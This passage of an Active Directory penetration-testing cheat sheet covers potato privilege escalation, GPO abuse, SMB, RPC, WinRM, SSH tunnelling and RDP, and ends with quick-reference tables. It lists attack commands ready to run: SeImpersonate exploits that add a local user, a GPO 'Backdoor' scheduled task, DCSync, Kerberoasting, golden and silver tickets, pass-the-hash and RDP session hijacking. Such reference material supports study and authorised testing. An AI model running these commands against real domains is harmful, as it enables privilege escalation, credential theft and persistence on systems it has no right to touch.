# Potato attacks (SeImpersonate)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user attacker Password123! /add"
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```
{% endcode %}

***

## Group Policy

Group Policy Objects (GPOs) apply configuration to users and computers.

### GPO Scope

| Scope      | Applied To                     |
| ---------- | ------------------------------ |
| **Site**   | AD site                        |
| **Domain** | Entire domain                  |
| **OU**     | Organizational Unit (cascades) |

Processing order: Local → Site → Domain → OU (LSDOU)

### Group Policy Template

Files in SYSVOL (\domain\SYSVOL\domain\Policies{GUID}).

```bash
Machine\
  Preferences\Groups\Groups.xml      # Local group membership
  Preferences\ScheduledTasks\        # Scheduled tasks
  Preferences\Services\Services.xml  # Service configuration
  Scripts\Startup\                   # Startup scripts
  Scripts\Shutdown\                  # Shutdown scripts
User\
  Preferences\                       # User preferences
  Scripts\Logon\                     # Logon scripts
  Scripts\Logoff\                    # Logoff scripts
```

### Group Policy Container

LDAP object storing GPO metadata.

```powershell
# Enumerate GPOs
Get-GPO -All
Get-ADObject -Filter {objectClass -eq "groupPolicyContainer"}

# Find GPO links
Get-GPLink
```

#### GPO Attacks

{% code overflow="wrap" %}
```bash
# GPO with write access - add malicious scheduled task or startup script
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author domain\user --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"

# Find GPOs with weak permissions
Get-NetGPO | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl"}
```
{% endcode %}

***

## Communication Protocols

### SMB

Server Message Block - file sharing, named pipes, RPC transport.

#### Shares

**Default Shares**

| Share    | Description                    |
| -------- | ------------------------------ |
| `C$`     | Default admin share (C: drive) |
| `ADMIN$` | %SystemRoot%                   |
| `IPC$`   | Named pipes                    |
| `PRINT$` | Printer drivers                |

**Default Domain Shares**

| Share      | Path                                        | Content       |
| ---------- | ------------------------------------------- | ------------- |
| `NETLOGON` | `%SystemRoot%\SYSVOL\sysvol\domain\SCRIPTS` | Logon scripts |
| `SYSVOL`   | `%SystemRoot%\SYSVOL\sysvol`                | GPOs, scripts |

```bash
# Enumerate shares
smbclient -L //target -U user%password
crackmapexec smb target -u user -p password --shares
smbmap -H target -u user -p password
```

#### Named Pipes

IPC mechanism over SMB (`\\.\pipe\pipename`).

| Pipe             | Service               | Attack Use               |
| ---------------- | --------------------- | ------------------------ |
| `\PIPE\srvsvc`   | Server service        | Share enumeration        |
| `\PIPE\samr`     | SAM                   | User enumeration         |
| `\PIPE\lsarpc`   | LSA                   | Policy enumeration       |
| `\PIPE\netlogon` | Netlogon              | ZeroLogon                |
| `\PIPE\spoolss`  | Print Spooler         | PrintNightmare, coercion |
| `\PIPE\efsrpc`   | EFS                   | PetitPotam               |
| `\PIPE\drsuapi`  | Directory Replication | DCSync                   |

### HTTP

Web services in an AD environment.

| Service             | Port   | Usage                |
| ------------------- | ------ | -------------------- |
| ADFS                | 443    | Federation           |
| ADCS Web Enrollment | 80/443 | Certificate requests |
| Exchange OWA        | 443    | Email                |
| SharePoint          | 80/443 | Collaboration        |

### RPC

Remote Procedure Call - invoke functions remotely.

#### RPC over SMB

Transport via named pipes (port 445).

#### RPC over TCP

Dynamic ports (RPC Endpoint Mapper on 135).

```bash
# RPC enumeration
rpcclient -U 'domain/user%password' target
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x1f4

# rpcdump
rpcdump.py domain/user:password@target
```

### WinRM

Windows Remote Management - WS-Management protocol.

| Port | Protocol |
| ---- | -------- |
| 5985 | HTTP     |
| 5986 | HTTPS    |

```bash
# Test connectivity
Test-WSMan -ComputerName target

# Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTHASH

# CrackMapExec
crackmapexec winrm target -u user -p password -x "whoami"
```

### PowerShell Remoting

Uses WinRM for remote PowerShell sessions.

#### Trusted Hosts

Clients must trust non-domain targets.

```powershell
# View trusted hosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# Add trusted host
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "target" -Force
```

### SSH

Secure Shell - increasingly common in Windows environments.

```bash
# Windows OpenSSH (Windows 10+)
ssh user@target

# With domain credentials
ssh domain\\user@target
```

#### SSH Tunneling

```bash
# Local port forward
ssh -L localport:remotehost:remoteport user@jumphost

# Dynamic SOCKS proxy
ssh -D 9050 user@jumphost

# Remote port forward
ssh -R remoteport:localhost:localport user@target

# ProxyChains through SOCKS
proxychains nmap -sT -p 445 192.168.1.1
```

### RDP

Remote Desktop Protocol - graphical remote access.

| Port | Description  |
| ---- | ------------ |
| 3389 | Standard RDP |

{% code overflow="wrap" %}
```bash
# Linux clients
xfreerdp /u:user /p:password /v:target
rdesktop target

# Pass the hash (Restricted Admin mode required)
xfreerdp /u:user /pth:NTHASH /v:target

# Enable Restricted Admin (requires admin)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Session hijacking (if SYSTEM on target)
query user
tscon <session_id> /dest:console
```
{% endcode %}

***

## Quick Reference Card

### Enumeration

<table><thead><tr><th width="178">Task</th><th>Command</th></tr></thead><tbody><tr><td>Domain info</td><td><code>Get-ADDomain</code></td></tr><tr><td>All users</td><td><code>Get-ADUser -Filter *</code></td></tr><tr><td>All computers</td><td><code>Get-ADComputer -Filter *</code></td></tr><tr><td>All groups</td><td><code>Get-ADGroup -Filter *</code></td></tr><tr><td>Domain Controllers</td><td><code>Get-ADDomainController -Filter *</code></td></tr><tr><td>Trusts</td><td><code>Get-ADTrust -Filter *</code></td></tr><tr><td>SPNs</td><td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td></tr><tr><td>LDAP query</td><td><code>ldapsearch -x -H ldap://dc -b "dc=domain,dc=com"</code></td></tr></tbody></table>

### Credential Attacks

<table><thead><tr><th width="140">Attack</th><th>Command</th></tr></thead><tbody><tr><td>DCSync</td><td><code>secretsdump.py domain/user:password@dc</code></td></tr><tr><td>Kerberoast</td><td><code>GetUserSPNs.py domain/user:password -request</code></td></tr><tr><td>ASREProast</td><td><code>GetNPUsers.py domain/ -usersfile users.txt -no-pass</code></td></tr><tr><td>Pass the hash</td><td><code>psexec.py -hashes :NTHASH domain/user@target</code></td></tr><tr><td>Golden ticket</td><td><code>ticketer.py -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN admin</code></td></tr><tr><td>Silver ticket</td><td><code>ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain DOMAIN -spn cifs/target admin</code></td></tr></tbody></table>

### Lateral Movement

<table><thead><tr><th width="124">Method</th><th>Command</th></tr></thead><tbody><tr><td>PsExec</td><td><code>psexec.py domain/user:password@target</code></td></tr><tr><td>WMIExec</td><td><code>wmiexec.py domain/user:password@target</code></td></tr><tr><td>Evil-WinRM</td><td><code>evil-winrm -i target -u user -p password</code></td></tr><tr><td>RDP</td><td><code>xfreerdp /u:user /p:password /v:target</code></td></tr><tr><td>PowerShell</td><td><code>Enter-PSSession -ComputerName target -Credential domain\user</code></td></tr></tbody></table>

### Common Ports

<table><thead><tr><th width="303">Port</th><th>Service</th></tr></thead><tbody><tr><td>53</td><td>DNS</td></tr><tr><td>88</td><td>Kerberos</td></tr><tr><td>135</td><td>RPC Endpoint Mapper</td></tr><tr><td>139</td><td>NetBIOS Session</td></tr><tr><td>389</td><td>LDAP</td></tr><tr><td>445</td><td>SMB</td></tr><tr><td>464</td><td>Kerberos Password</td></tr><tr><td>636</td><td>LDAPS</td></tr><tr><td>3268</td><td>Global Catalog</td></tr><tr><td>3269</td><td>Global Catalog SSL</td></tr><tr><td>3389</td><td>RDP</td></tr><tr><td>5985</td><td>WinRM HTTP</td></tr><tr><td>5986</td><td>WinRM HTTPS</td></tr></tbody></table>

***

### Tools Summary

<table><thead><tr><th width="222">Category</th><th>Tools</th></tr></thead><tbody><tr><td><strong>Enumeration</strong></td><td>BloodHound, PowerView, ADRecon, ldapsearch, rpcclient</td></tr><tr><td><strong>Credential Extraction</strong></td><td>Mimikatz, pypykatz, secretsdump.py, LaZagne</td></tr><tr><td><strong>Kerberos</strong></td><td>Rubeus, Impacket (getTGT, getST, GetUserSPNs), kerbrute</td></tr><tr><td><strong>Lateral Movement</strong></td><td>Impacket suite, CrackMapExec, Evil-WinRM, PsExec</td></tr><tr><td><strong>Relay/Poisoning</strong></td><td>Responder, ntlmrelayx, Inveigh, mitm6</td></tr><tr><td><strong>Privilege Escalation</strong></td><td>PowerUp, PrivescCheck, Certify, Certipy</td></tr></tbody></table>
